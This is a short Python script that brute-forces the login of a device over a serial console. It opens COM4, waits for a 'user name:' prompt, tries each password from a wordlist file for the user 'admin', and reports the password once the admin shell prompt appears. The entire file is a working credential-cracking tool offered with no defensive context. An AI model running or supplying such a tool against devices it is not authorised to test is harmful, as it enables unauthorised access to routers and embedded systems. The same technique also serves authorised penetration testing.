import serial


class serial_pw_crack:
    def __init__(self):
        self.ser = serial.Serial('COM4', 115200, timeout=0.1)
        self.username = 'admin'
        self.pwtext = 'password.txt'

    def DoCrack(self, username, password):
        # input username

        self.ser.write((username + '\n').encode())
        # print(username)
        # input password
        # self.ser.read(4096).decode()
        self.ser.write((password + '\n').encode())
        readbuf = self.ser.read(4096).decode()
        if 'admin$' in readbuf:
            print("Crack OK. The password is: (%s:%s)" % (username, password))
            return True

        return False

    def Run(self):
        while True:
            self.ser.write('\n'.encode())
            buf = self.ser.read(4096).decode()
            if "user name:" in buf:
                break

        with open(self.pwtext, 'r') as fp:
            pwlist = fp.read().split('\n')

        for pw in pwlist:
            if self.DoCrack('admin', pw) is True:
                break


sc = serial_pw_crack()
sc.Run()
